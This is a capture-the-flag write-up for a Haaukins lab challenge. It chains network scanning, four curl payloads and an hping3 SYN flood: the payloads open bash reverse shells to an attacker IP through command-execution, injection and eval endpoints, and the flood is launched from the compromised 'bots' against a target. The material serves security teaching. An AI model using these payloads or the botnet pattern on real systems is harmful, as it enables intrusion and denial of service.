# bots-bots-bots

> **Platform:** Haaukins 
> **Category:** misc  
> **Difficulty:** Easy  
> **Goal:** Find and exploit vulnerable “bot” hosts, turn them into a small botnet, then generate distributed traffic against the target service to reveal the flag.

---

## ⚠️ Disclaimer

This repository is a Capture The Flag (CTF) challenge designed to run in a controlled **Haaukins** lab environment.

Do **not** run these techniques against systems or networks you do not own or do not have explicit permission to test. The author(s) are not responsible for misuse or damage caused by running this outside an authorized environment.

---

## What you’re given

A /24 network range for the exercise. Within that range:

- Several vulnerable “bots” expose web endpoints that can be abused to execute commands.
- One “target” host changes behavior after it receives enough distributed traffic and then reveals the flag.

---

## Prerequisites

- Basic Bash + reverse shells
- `nmap`
- `curl`
- `netcat` / `nc`
- `hping3`

---

## Variables used in this write-up

Replace these with values from your Haaukins lab:

- `<RANGE>` — the provided /24 range (example: `77.112.237.54/24`)
- `<HELPER_IP>` — **your** attacker/receiver IP in the lab (example: `77.112.237.4`)
- `<TARGET_IP>` — the target service IP (example: `77.112.237.54`)
- `<BOTn_IP>` — discovered bot IPs (example bot IPs existed in the lab)
- `<PORTn>` — local listener ports (example: `9001`–`9004`)

---

## Step 1 — Discover live hosts

Start with host discovery in the given /24:

```bash
nmap -sn <RANGE>
```

This yields a list of responsive IPs. Next, check which ones expose web services.

---

## Step 2 — Enumerate services

For each responsive host, enumerate ports and attempt service/version detection:

```bash
nmap -sV -p- <HOST_IP>
```

You’re looking for bots exposing a web service (in this lab it was commonly `:5000`) and for the target host.

---

## Step 3 — Get shells on the bots

The goal is to gain a shell on multiple bot hosts so you can later generate traffic from several different sources.

### 3.1 Create listeners (attacker side)

Open **four** terminal tabs and start listeners (one per bot):

```bash
nc -lvp 9001
nc -lvp 9002
nc -lvp 9003
nc -lvp 9004
```

### 3.2 Trigger reverse shells (bot side)

In a fifth terminal, trigger each bot’s vulnerable endpoint using `curl`.  
After each request, you can press **CTRL+C** and move on to the next.

> Note: The exact endpoints below match the lab layout used when this write-up was created. Your instance may differ; always confirm with recon.

#### Bot 1 — direct command execution endpoint

```bash
curl "http://<BOT1_IP>:5000/exec?cmd=bash+-c+'bash+-i+>%2Fdev%2Ftcp%2F<HELPER_IP>%2F9001+0>%261'"
```

#### Bot 2 — command execution via POST body

```bash
curl -X POST -d "cmd=bash+-c+'bash+-i+>%2Fdev%2Ftcp%2F<HELPER_IP>%2F9002+0>%261'"   "http://<BOT2_IP>:5000/shell"
```

#### Bot 3 — command injection via parameter concatenation

```bash
curl "http://<BOT3_IP>:5000/ping?host=127.0.0.1;bash+-c+'bash+-i+>%2Fdev%2Ftcp%2F<HELPER_IP>%2F9003+0>%261'"
```

#### Bot 4 — unsafe eval-style endpoint

```bash
curl "http://<BOT4_IP>:5000/eval?code=__import__('os').system("bash+-c+'bash+-i+>%2Fdev%2Ftcp%2F<HELPER_IP>%2F9004+0>%261'")"
```

✅ If everything worked, each `nc` tab should now have a shell connected from a different bot.

---

## Step 4 — Launch distributed traffic from the bots

From **each bot shell** (each `nc` tab), run the traffic generator against the target:

```bash
hping3 -c 10 -S -p 80 <TARGET_IP>
```

This sends a small SYN burst at the target’s HTTP port from multiple hosts. In the lab context, the target uses this to detect “DDoS-like” behavior and unlock the flag.

---

## Step 5 — Capture the flag

After the target has received enough traffic, refresh the target website/service page to retrieve the flag:

```
HKN{dynamic_flag}
```

---

## Notes / Takeaways

- The intended learning is the *chain*: **recon → exploit → coordination → distributed effect**.
- The “botnet” here is intentionally tiny and lab-contained, but mirrors real-world concepts:
  - weak remote command execution surfaces
  - chaining multiple compromises
  - distributed traffic shaping behavior at a target

